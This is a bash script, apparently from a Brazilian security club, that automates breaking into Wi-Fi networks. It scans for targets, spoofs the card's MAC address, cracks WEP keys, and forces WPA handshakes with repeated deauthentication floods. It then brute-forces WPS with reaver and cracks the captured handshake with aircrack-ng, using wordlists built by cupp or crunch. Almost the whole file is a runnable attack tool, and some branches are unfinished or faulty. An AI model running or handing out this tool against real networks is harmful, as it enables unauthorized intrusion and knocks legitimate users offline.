#!/bin/bash
# wifi_breaker.sh
# Gabriel Haab, April,2016
# Version 1.0: Searching and selecting Network.
# Version 2.0: Breaking into WEP.
# Version 3.0: Breaking into WPA.
# Version 4.0: Creating dictionary for bruteforce attacks.
# Version 5.0: Checking dependencies
# NextUpdates: Verifing WPS and EvilTwin attack.

MENSAGEM_USO=" 

This script was created by the cyber security club in Brazil called GSI. 
You need to be root to run this script. 

options: 

-h, --help:Welcome, this is the help screen. 
ex: bash $(basename "$0") -h

-v, --version: Show the version of the software.
ex: bash $(basename "$0") -v

-n, --normal: Configure the wireless card back to normal.
ex: bash $(basename "$0") -n wlan0

-m, --monitor: Configure the wireless card to monitor mode.
ex: bash $(basename "$0") -m wlan0

To use the script just type:
bash $(basename "$0")

"

case "$1" in 
	-h | --help)
		echo "$MENSAGEM_USO"
		exit 0
;;

	-v | --version)
		#echo -n $(basename "$0")
		grep '^# Versão ' $0 |  tail -1 | cut -d : -f 1 | tr -d \#
		exit 0
;;

	-n | --normal)
		ifconfig $2 down 
		iw dev mon0 del
		ifconfig $2 up
		exit 0
;;

	-m | --monitor)
		ifconfig $2 down 
		iw dev $2 interface add mon0 type monitor
		ifconfig mon0 down		
		iwconfig mon0 mode monitor		
		ifconfig mon0 up
		exit 0
;;
esac

# ============================== Inicio do Script ===============================
printf "\033c"
echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
echo "================================================================"
echo "=  _        ___  __ _     ____                 _               ="
echo "= \ \      / (_)/ _(_)   | __ ) _ __ ___  __ _| | _____ _ __   ="
echo "=  \ \ /\ / /| | |_| |   |  _ \|  __/ _ \/ _  | |/ / _ \  __|  ="
echo "=   \ V  V / | |  _| |   | |_) | | |  __/ (_| |   <  __/ |     ="
echo "=    \_/\_/  |_|_| |_|   |____/|_|  \___|\__ _|_|\_\___|_|     ="
echo "=                                                              ="
echo "================================================================"
echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

echo "\n\nType bash $(basename "$0") -h for more information\n\n"

#========================== is the user root? ============================

if [ $(id -u) != "0" ]; then
    echo "You need to be root to run this software, try:\nsudo sh wifi_breaker.sh"
echo "\n"
    exit 1
fi
#========================= Checking dependencies ===============================

if command -v aircrack-ng >/dev/null 2>&1 ; then
echo "aircrack-ng [OK]"
else 
echo "aircrack-ng [ ] Please install this software to use this script"
fi

if command -v wash >/dev/null 2>&1 ; then
echo "wash [OK]"
else 
echo "wash [ ] Please install this software to use this script"
fi

if command -v reaver >/dev/null 2>&1 ; then
echo "reaver [OK]"
else 
echo "reaver [ ] Please install this software to use this script"
fi

if command -v macchanger >/dev/null 2>&1 ; then
echo "macchanger [OK]"
else 
echo "macchanger [ ] Please install this software to use this script"
fi

echo ""
echo "****Press enter to continue****" 
read -r DumbValue

#========================= Configurate the monitor mode ===============================

echo "\n[+] Please use a wireless card that supports package injection\n"
echo "Please select the wireless interface that you wanna use:" 

select inter in `iw dev | grep Interface | cut -d ' ' -f 2` ; do
	if [ $inter ]; then
		break
	else
		echo "please choose the number next to the interface"
	fi
done
	
echo "The choosed interface is $inter"

echo "...Configurating the interface to monitor mode...."

ifconfig $inter down 
iw dev $inter interface add mon0 type monitor
sleep 2
echo "Interface mon0 created"
ifconfig mon0 down
sleep 1
iwconfig mon0 mode monitor
sleep 1	
ifconfig mon0 up 
echo "mon0 interface is ready for tests"
sleep 5

# =============================== Search for networks ===============================

airodump-ng mon0 -w search.cap &(
	sleep 10
	killall airodump-ng
	rm search.cap-01.kismet.csv
	rm search.cap-01.kismet.netxml
	rm search.cap-01.cap
	sleep 2
	)

printf "\033c"

cp search.cap-01.csv report.csv
sleep 1

continue=y;
while [ $continue = 'y' ]; do
		
	echo "Select the number of the nerwork:" 
	select net in `cat search.cap-01.csv | cut -d , -f 14`; do
		if [ $net ]; then
			break
		else 
			echo "Select the number next to the target network"
		fi 
	done

	echo "The selected network is $net"

	echo "Selected Network: " >> report.csv
	date >> report.csv
	cat search.cap-01.csv | grep -n ^ | grep $net >> report.csv 

	echo "\nInformation about the selected network:"

	echo "Name:"
	nome=`cat search.cap-01.csv | grep -n ^ | grep $net | cut -d , -f 14`
	echo $nome

	echo "\nMac:"
	mac=`cat search.cap-01.csv | grep -n ^ | grep $net | cut -d , -f 1 | cut -d : -f 2,3,4,5,6,7,8`
	echo $mac

	echo "\nCriptography:"
	crip=`cat search.cap-01.csv | grep -n ^ | grep $net | cut -d , -f 6`
	echo $crip

	echo "\nChannel:"
	ch=`cat search.cap-01.csv | grep -n ^ | grep $net | cut -d , -f 4`
	echo $ch

	echo "\nSignal Power:" 
	cat search.cap-01.csv | grep -n ^ | grep $net | cut -d , -f 9


echo "\n Would you like to select another network? y/n" 
select continue in y n; do
	if [ $continue ]; then
		break;
	else 
		echo "Please choose number next to the choice"
	fi
	done
done

# ======================= Changing the MAC adress of the card ============================

echo "\n Would you like to change the mac adress of your card? y/N (r for a random)" 

read -r op2

if [ $op2 = "y" ] || [ $op2 = "Y" ];
	then
	
	echo "Selected to change the wireless card mac addres " >> report.csv
	date >> report.csv	
	echo "Original Address : " >> report.csv
	ifconfig mon0 | grep unspec >> report.csv

	echo "Please type a new mac adress"
	read -r mac2
	ifconfig mon0 down 
	ifconfig mon0 hw ether $mac2
	sleep 1	
	ifconfig mon0 up
	echo "New MAC adress"
	ifconfig mon0 | grep unspec >> report.csv
fi

if [ $op2 = "r" ] || [ $op2 = "R" ];
	then 
	echo "Selected to change the wireless card MAC randomly " >> report.csv 
	date >> report.csv	
	echo "Original MAC : " >> report.csv
	ifconfig mon0 | grep unspec >> report.csv
	sleep 1

	ifconfig mon0 down
	macchanger -r mon0
	sleep 5 
	ifconfig mon0 up
	echo "New MAC: " >> report.csv
	ifconfig mon0 | grep unspec >> report.csv
	sleep 1
fi

# ======================= Breaking into the network ======================

printf "\033c"

# ======================= OPN? =============================

if test "$crip" = " OPN"
	then
	
	echo "End of testing:" >> report.csv
	date >> report.csv
	echo "Results:" >> report.csv
	
	echo "The selected network does not have criptography" >> report.csv
	
	echo "The selected network does not have criptography"
	
	fi


# =====================================  WEP?  =================================== 


if test "$crip" = " WEP"
	then
	echo "Breaking WEP"
	sleep 4
	
	echo "Start the tests to break WEP:" >> report.csv
	date >> report.csv

	airodump-ng -c $ch --bssid $mac -w ChaveWEP.cap	mon0 &(		
		
	
		#echo 'wait 200 seconds'
		#sleep 200
		
		# while (IV < 35000)
		IV=`cat ChaveWEP.cap-01.csv | grep Rede | cut -d , -f 11`
		
		if test "$IV" = "        35000"
		then
		killall airodump-ng
		fi			
		)

		echo "Wireless password: "
		aircrack-ng ChaveWEP-01.cap	
		
		echo "End of tests:" >> report.csv
		date >> report.csv
		echo "Results:"
		
fi


# ======================= WPA?  =======================


if test "$crip" = " WPA"
	then
	echo ".....Wait 40 seconds....." 
	sleep 3
	echo ".....Breaking WPA2 Encryption....."
	sleep 2
		airodump-ng --bssid $mac -c $ch -w ChaveWPA2 mon0&(
		sleep 10
		aireplay-ng -0 10 -a $mac mon0 --ignore-negative-one
		sleep 10
		aireplay-ng -0 10 -a $mac mon0 --ignore-negative-one
		sleep 10
		aireplay-ng -0 10 -a $mac mon0 --ignore-negative-one
		sleep 10
		killall airodump-ng
	)
	sleep 5

printf "\033c"

# ================================= Bruteforce w/ WPS (Still need to fix) =========================

#	touch report_wps.txt
	echo "Looking if the network has active WPS"
#	wash -i mon0 | greap $mac >> report_wps.txt &(
#	sleep 10 
#	killall wash
#	)
#
#	wps=`cat report_wps | grep $mac | cut -d '' -f -50`
	echo "...Doing tests..."
	sleep 2
#	if test "$wps" = "NO"
#	then
		echo "How would you like to proceed the attack:\n1 - WPS bruteforce\n2 - Handshake Bruteforce\n3 - EvilTwin"
		read -r op4		
		if test $op4 = "1"
		then
		echo "Password:"
		reaver -i mon0 -b $mac -vv
		fi
#	fi

# ================ Bruteforcing the password  =================
	
	if [ $op4 = "2" ];
	then
	
		echo "\n1-Create a wordlist based on social engineering\n2-Use a existent wordlist\n3-create a number based wordlist"
		read -r op3

		if [ $op3 = "1" ];
		then
			echo "Creating Wordlist:"
			cd cupp
			python cupp.py -i
			mv Dic_GSI.txt ..
			cd ..
			sleep 3
	
			aircrack-ng -w Dic_GSI.txt ChaveWPA2-01.cap
			fi
	
		if [ $op3 = "2" ];then
		echo "Please input the path of the wordlist"
		read -r dic
		sleep 3

		aircrack-ng -w $dic ChaveWPA2-01.cap
		fi

		if [ $op3 = "3" ];then
		echo "Please type the lowest number of characters"
		read -r min
		echo "Please input the max number of characteres"
		read -r max
		crunch $min $max > Dic_GSI.txt 
		sleep 3

		aircrack-ng -w Dic_GSI.txt ChaveWPA2-01.cap
		fi

		fi
		
	#fi
# ======================= Evil Twin =======================
	
	if [ $op4 = "3" ];
	then


	fi

else 

echo "There is a problem identifying the Encryption"

fi



# ======================= Turning the wireless card back to normal =======

	echo "Reverting the wireless card back to normal:" >> report.csv
	date >> report.csv
	
	echo "...Configurating the wireless card back to normal..." 
	ifconfig $inter down 
	sleep 1
	iw dev mon0 del
	sleep 1	
	ifconfig $inter up
	sleep 1	

# =================================================================================

sleep 1
mkdir "$nome"
sleep 1
mv report.csv "$nome"
sleep 1
rm search.cap-01.csv
sleep 1
mv ChaveW* "$nome"
sleep 1
mv Dic_GSI.txt "$nome"

echo "\n End of Script"
